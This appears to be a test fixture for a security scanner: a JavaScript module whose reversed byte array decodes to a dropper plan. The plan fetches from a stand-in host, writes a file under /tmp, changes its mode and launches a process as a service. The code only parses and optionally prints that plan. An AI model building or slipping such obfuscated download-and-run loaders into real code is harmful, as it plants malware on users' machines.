const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_970cd230 = "[101,99,105,118,114,101,115,46,48,102,54,52,97,51,45,101,100,111,110,61,101,109,97,110,95,101,99,105,118,114,101,115,124,104,99,114,97,46,115,115,101,99,111,114,112,61,101,98,111,114,112,95,104,99,114,97,124,115,106,109,46,99,51,97,57,55,98,48,102,54,52,97,51,45,101,103,97,116,115,46,47,101,100,111,110,45,115,115,101,114,116,110,117,104,47,112,109,116,47,61,104,116,97,112,95,101,108,105,102,124,54,52,97,51,47,116,105,100,117,65,101,100,111,78,61,116,110,101,103,97,95,114,101,115,117,124,105,112,97,47,100,105,108,97,118,110,105,46,101,108,112,109,97,120,101,46,99,51,97,57,55,98,48,102,54,52,97,51,45,101,100,111,110,47,47,58,115,112,116,116,104,61,108,114,117,124,55,66,48,70,54,52,65,51,45,69,68,79,78,61,100,105,95,110,103,105,97,112,109,97,99,124,53,61,116,110,117,111,99,95,101,103,97,116,115,124,107,99,97,98,108,108,97,102,95,104,99,114,97,95,115,112,116,116,104,61,114,101,116,112,97,100,97,124,115,115,101,99,111,114,112,95,104,99,116,97,112,115,105,100,44,101,100,111,109,95,101,103,110,97,104,99,44,101,108,105,102,95,101,116,105,114,119,44,101,116,111,109,101,114,95,101,114,105,117,113,99,97,44,116,115,111,104,95,101,108,105,102,111,114,112,61,115,112,101,116,115,124,49,61,118]";
const Codec_970cd230 = "json_numbers|reverse_bytes|";

function load_970cd230() { return JSON.parse(Material_970cd230); }
function decode_970cd230(e) { return [...e].reverse(); }
async function recover_970cd230() {
  const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const e = load_970cd230(); let d = [];
  for (const p of [1]) d = decode_970cd230(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_970cd230() { return ({ ...{ value: await recover_970cd230() } }).value; }
async function plan_970cd230() { const inspect = inspect_970cd230; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_970cd230;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_970cd230());
